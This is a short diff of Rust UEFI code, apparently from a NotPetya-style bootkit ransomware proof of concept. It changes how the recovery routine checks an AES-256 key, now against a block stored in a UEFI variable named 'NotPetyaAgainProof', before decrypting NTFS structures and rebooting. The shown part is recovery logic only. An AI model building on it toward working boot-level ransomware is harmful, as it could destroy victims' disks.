@@ -11,15 +11,17 @@ use uefi::Status;
 
 use crate::file::{read_file, write_file};
 use crate::ntfs::{get_data_runs, read_mft_entry, OEM_ID};
+use crate::read_var;
 
 fn read_test_file(st: &SystemTable<Boot>, key_bytes: &[u8; 32]) -> uefi::Result<bool> {
     let key = GenericArray::from_slice(key_bytes);
     let cipher = Aes256::new(key);
 
-    let test_buf = read_file(st, "test")?;
+    let mut test_buf = [0u8; 16];
+    let test_buf = read_var(st, "NotPetyaAgainProof", &mut test_buf)?;
 
     let mut block = Block::default();
-    block.copy_from_slice(&test_buf);
+    block.copy_from_slice(test_buf);
 
     cipher.decrypt_block(&mut block);
 
@@ -120,6 +122,4 @@ pub fn recover(st: &mut SystemTable<Boot>, key_bytes: &[u8]) -> uefi::Result {
 
     st.runtime_services()
         .reset(ResetType::Cold, Status::SUCCESS, Some(&[]));
-
-    //Ok(())
 }
